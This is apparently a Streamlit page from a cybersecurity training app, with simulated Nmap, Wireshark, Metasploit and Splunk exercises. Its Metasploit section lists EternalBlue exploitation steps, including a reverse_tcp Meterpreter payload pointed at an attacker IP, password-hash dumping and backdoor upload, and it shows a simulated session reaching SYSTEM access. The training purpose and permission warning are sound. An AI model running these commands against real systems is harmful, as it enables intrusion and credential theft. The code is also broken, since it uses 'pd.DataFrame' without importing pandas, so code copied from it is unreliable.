"""
TOOL PRACTICE ARENA - LEARN BY DOING
Practice with REAL cybersecurity tools - Interactive command-line training

Tools included:
- Nmap (Network scanning)
- Wireshark (Packet analysis)
- Metasploit (Penetration testing)
- Burp Suite (Web testing)
- John the Ripper (Password cracking)
- Splunk (SIEM)
- And 20+ more!
"""

import streamlit as st
from datetime import datetime
import random

st.set_page_config(page_title="Tool Practice Arena", page_icon="⚔️", layout="wide")

# Check login
if 'user_email' not in st.session_state or not st.session_state.get('logged_in'):
    st.error("🔒 Please log in to access Tool Practice Arena")
    if st.button("🔐 Go to Login"):
        st.switch_page("app.py")
    st.stop()

user_email = st.session_state.user_email

# Header
st.title("⚔️ Tool Practice Arena")
st.markdown("**Master REAL cybersecurity tools through hands-on practice**")
st.markdown(f"Student: {user_email}")

st.divider()

# Tool selection
tool_categories = {
    "🌐 Network Scanning": ["Nmap", "Masscan", "Netcat", "Hping3"],
    "🦈 Packet Analysis": ["Wireshark", "tcpdump", "tshark"],
    "🎯 Exploitation": ["Metasploit", "SQLmap", "Burp Suite", "OWASP ZAP"],
    "🔓 Password Cracking": ["John the Ripper", "Hashcat", "Hydra"],
    "🔍 SIEM & Logs": ["Splunk", "ELK Stack", "Graylog"],
    "🕵️ Forensics": ["Autopsy", "Volatility", "FTK Imager"],
    "🛡️ Defense": ["Snort", "Suricata", "OSSEC"],
    "🔧 Utilities": ["Curl", "Wget", "SSH", "FTP"]
}

selected_category = st.selectbox("Select Tool Category:", list(tool_categories.keys()))
selected_tool = st.selectbox("Select Tool:", tool_categories[selected_category])

st.divider()

# Tool-specific content
if selected_tool == "Nmap":
    st.header("🌐 Nmap - Network Mapper")
    
    st.markdown("""
    **What is Nmap?**
    The #1 network scanning tool used by SOC analysts worldwide. Discover hosts, ports, services, and vulnerabilities.
    
    **Real-world use:** Every SOC analyst uses Nmap daily for network reconnaissance and security audits.
    """)
    
    # Cheat sheet
    with st.expander("📋 Nmap Cheat Sheet"):
        st.code("""
# Basic Scans
nmap 192.168.1.1                    # Basic scan
nmap 192.168.1.0/24                 # Scan entire subnet
nmap 192.168.1.1-254                # Scan range

# Port Scans
nmap -p 80,443 192.168.1.1          # Specific ports
nmap -p- 192.168.1.1                # All ports
nmap -p 1-1000 192.168.1.1          # Port range

# Service Detection
nmap -sV 192.168.1.1                # Detect versions
nmap -O 192.168.1.1                 # OS detection
nmap -A 192.168.1.1                 # Aggressive scan (OS, version, scripts)

# Stealth Scans
nmap -sS 192.168.1.1                # SYN scan (stealth)
nmap -sT 192.168.1.1                # TCP connect scan
nmap -sU 192.168.1.1                # UDP scan

# Speed & Timing
nmap -T4 192.168.1.1                # Faster scan
nmap -T0 192.168.1.1                # Slowest (stealth)

# Output
nmap -oN scan.txt 192.168.1.1       # Normal output
nmap -oX scan.xml 192.168.1.1       # XML output
        """, language="bash")
    
    # Interactive practice
    st.markdown("### 🎯 Practice Challenge")
    
    st.info("""
    **Scenario:** You're investigating a suspicious server at 10.10.10.50
    
    **Your mission:**
    1. Find all open ports
    2. Identify the web server version
    3. Check if SSH is running
    4. Determine the operating system
    """)
    
    # Simulated target
    st.markdown("**Target:** 10.10.10.50")
    
    command = st.text_input("Enter your Nmap command:", placeholder="nmap -sV 10.10.10.50")
    
    if st.button("▶️ Execute Command"):
        if "nmap" in command.lower():
            # Simulate different outputs based on command
            if "-sV" in command or "-A" in command:
                st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.50
Host is up (0.0023s latency).
Not shown: 995 closed ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  ssl/http   Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql      MySQL 5.7.38-0ubuntu0.18.04.1
8080/tcp open  http       Apache Tomcat 9.0.65

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
                """, language="bash")
                st.success("✅ Great! You found 5 open ports and identified services!")
                
            elif "-O" in command:
                st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.50
Host is up (0.0023s latency).

OS details: Linux 4.15 - 5.6
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS detection performed.

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
                """, language="bash")
                st.success("✅ OS detected: Linux!")
                
            elif "-p-" in command:
                st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.50
Host is up (0.0023s latency).
Not shown: 65530 closed ports

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
8080/tcp  open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 42.18 seconds
                """, language="bash")
                st.success("✅ Full port scan complete!")
            else:
                st.code("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.50
Host is up (0.0023s latency).
Not shown: 995 closed ports

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
                """, language="bash")
                st.info("💡 Try adding -sV to detect service versions!")
        else:
            st.error("❌ Invalid command. Must start with 'nmap'")
    
    # Quiz
    st.markdown("### 📝 Quick Quiz")
    q1 = st.radio("What port is SSH running on?", ["21", "22", "23", "80"])
    q2 = st.radio("What web server is running?", ["Nginx", "Apache", "IIS", "Tomcat"])
    
    if st.button("Submit Answers"):
        score = 0
        if q1 == "22":
            st.success("✅ Q1 Correct!")
            score += 50
        else:
            st.error("❌ Q1 Incorrect")
        
        if q2 == "Apache":
            st.success("✅ Q2 Correct!")
            score += 50
        else:
            st.error("❌ Q2 Incorrect")
        
        if score == 100:
            st.balloons()
            st.success("🎉 Perfect score! +100 points earned!")

elif selected_tool == "Wireshark":
    st.header("🦈 Wireshark - Packet Analysis")
    
    st.markdown("""
    **What is Wireshark?**
    The world's most popular network protocol analyzer. Capture and analyze network traffic in real-time.
    
    **Real-world use:** Investigate network issues, detect attacks, analyze malware traffic.
    """)
    
    with st.expander("📋 Wireshark Filters Cheat Sheet"):
        st.code("""
# Display Filters
ip.addr == 192.168.1.1              # Show traffic to/from IP
ip.src == 192.168.1.1               # Source IP
ip.dst == 192.168.1.1               # Destination IP

tcp.port == 80                      # HTTP traffic
tcp.port == 443                     # HTTPS traffic
tcp.port == 22                      # SSH traffic

http                                # All HTTP traffic
http.request.method == "POST"       # HTTP POST requests
http.response.code == 404           # 404 errors

dns                                 # DNS traffic
dns.qry.name contains "malware"     # DNS queries with "malware"

# Protocol Filters
tcp                                 # TCP traffic
udp                                 # UDP traffic
icmp                                # ICMP (ping)
arp                                 # ARP traffic

# Logical Operators
ip.addr == 192.168.1.1 && tcp.port == 80    # AND
ip.addr == 192.168.1.1 || ip.addr == 10.0.0.1  # OR
!(tcp.port == 80)                   # NOT
        """, language="bash")
    
    st.markdown("### 🎯 Practice: Analyze Suspicious Traffic")
    
    st.info("""
    **Scenario:** You captured network traffic during a suspected data breach.
    Analyze the PCAP file to find evidence.
    """)
    
    # Sample packet data
    st.markdown("**Captured Packets (Sample):**")
    
    packets = pd.DataFrame({
        "No.": [1, 2, 3, 4, 5, 6],
        "Time": ["0.000", "0.123", "0.245", "0.367", "0.489", "0.611"],
        "Source": ["192.168.1.100", "10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100", "185.220.101.45"],
        "Destination": ["10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100", "10.0.0.50", "192.168.1.100"],
        "Protocol": ["TCP", "TCP", "HTTP", "HTTP", "TCP", "TCP"],
        "Info": ["SYN", "SYN, ACK", "GET /admin", "200 OK", "FIN", "SYN"]
    })
    
    st.dataframe(packets, use_container_width=True)
    
    filter_input = st.text_input("Enter Wireshark filter:", placeholder="ip.addr == 192.168.1.100")
    
    if st.button("Apply Filter"):
        if "192.168.1.100" in filter_input:
            st.success("✅ Filtered! Showing traffic for 192.168.1.100")
            st.dataframe(packets[packets["Source"].str.contains("192.168.1.100") | packets["Destination"].str.contains("192.168.1.100")])
        elif "http" in filter_input.lower():
            st.success("✅ Filtered! Showing HTTP traffic")
            st.dataframe(packets[packets["Protocol"] == "HTTP"])
        else:
            st.info("Filter applied")

elif selected_tool == "Metasploit":
    st.header("🎯 Metasploit Framework")
    
    st.markdown("""
    **What is Metasploit?**
    The most popular penetration testing framework. Test system security by simulating real attacks.
    
    **Real-world use:** Penetration testers use Metasploit to find and exploit vulnerabilities (ethically).
    """)
    
    with st.expander("📋 Metasploit Cheat Sheet"):
        st.code("""
# Starting Metasploit
msfconsole                          # Start console

# Searching
search type:exploit platform:windows
search cve:2021                     # Search by CVE
search ms17-010                     # Search EternalBlue

# Using Modules
use exploit/windows/smb/ms17_010_eternalblue
show options                        # Show required options
set RHOSTS 192.168.1.100           # Set target
set LHOST 192.168.1.50             # Set attacker IP
set PAYLOAD windows/meterpreter/reverse_tcp
exploit                            # Run exploit

# Meterpreter Commands (after exploitation)
sysinfo                            # System information
getuid                             # Current user
ps                                 # Running processes
shell                              # Get system shell
download file.txt                  # Download file
upload backdoor.exe                # Upload file
hashdump                           # Dump password hashes
        """, language="bash")
    
    st.warning("⚠️ **IMPORTANT:** Only use Metasploit on systems you own or have permission to test!")
    
    st.markdown("### 🎯 Practice: Ethical Hacking Lab")
    
    st.info("""
    **Scenario:** You're testing a vulnerable Windows server (with permission).
    Use Metasploit to find and exploit the EternalBlue vulnerability.
    """)
    
    st.code("""
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options:
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS                     yes       Target address
   RPORT     445              yes       Target port

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.50
RHOSTS => 10.10.10.50

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] 10.10.10.50:445 - Connecting to target for exploitation.
[+] 10.10.10.50:445 - Connection established for exploitation.
[*] 10.10.10.50:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.50:445 - CORE raw buffer dump (42 bytes)
[+] 10.10.10.50:445 - Target is vulnerable!
[*] Sending stage (200774 bytes) to 10.10.10.50
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer        : WIN-SERVER2019
OS              : Windows Server 2019
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > 
    """, language="bash")
    
    st.success("✅ Exploitation successful! You have SYSTEM access!")

elif selected_tool == "Splunk":
    st.header("🔍 Splunk - SIEM Platform")
    
    st.markdown("""
    **What is Splunk?**
    The leading SIEM platform for log analysis and security monitoring.
    
    **Real-world use:** 90% of Fortune 500 companies use Splunk for security operations.
    """)
    
    with st.expander("📋 Splunk SPL Cheat Sheet"):
        st.code("""
# Basic Search
index=security sourcetype=firewall

# Time Range
earliest=-24h latest=now

# Statistics
| stats count by src_ip
| stats avg(response_time) by host
| stats sum(bytes) by user

# Filtering
| where status="failed"
| where count > 10
| search action="blocked"

# Top Values
| top src_ip limit=10
| rare dest_port

# Sorting
| sort -count
| sort +time

# Fields
| fields src_ip, dest_ip, action
| table time, user, action

# Transactions
| transaction user maxspan=5m

# Alerts
| where count > 100
| eval severity="high"
        """, language="spl")
    
    st.markdown("### 🎯 Practice: Detect Brute Force Attack")
    
    search_query = st.text_area("Enter Splunk search:", 
        placeholder='index=security sourcetype=auth | stats count by src_ip | where count > 5',
        height=100)
    
    if st.button("Run Search"):
        if "stats count" in search_query and "src_ip" in search_query:
            st.success("✅ Search executed!")
            
            results = pd.DataFrame({
                "src_ip": ["185.220.101.45", "103.45.12.89", "192.168.1.100"],
                "count": [127, 89, 3]
            })
            
            st.dataframe(results)
            st.warning("🚨 Alert: 185.220.101.45 has 127 failed login attempts!")
        else:
            st.info("Search executed")

st.divider()

# Tool resources
st.header("📚 Learning Resources")

col_res1, col_res2, col_res3 = st.columns(3)

with col_res1:
    st.markdown("**📖 Documentation**")
    st.markdown("- Official tool docs")
    st.markdown("- Command references")
    st.markdown("- Best practices")

with col_res2:
    st.markdown("**🎥 Video Tutorials**")
    st.markdown("- Step-by-step guides")
    st.markdown("- Real-world examples")
    st.markdown("- Expert tips")

with col_res3:
    st.markdown("**🏆 Certifications**")
    st.markdown("- Tool-specific certs")
    st.markdown("- Practice exams")
    st.markdown("- Study guides")

st.markdown("---")
st.caption("⚔️ Tool Practice Arena - Master the tools, master the trade")
st.caption(f"Session: {datetime.now().strftime('%B %d, %Y at %I:%M %p')}")
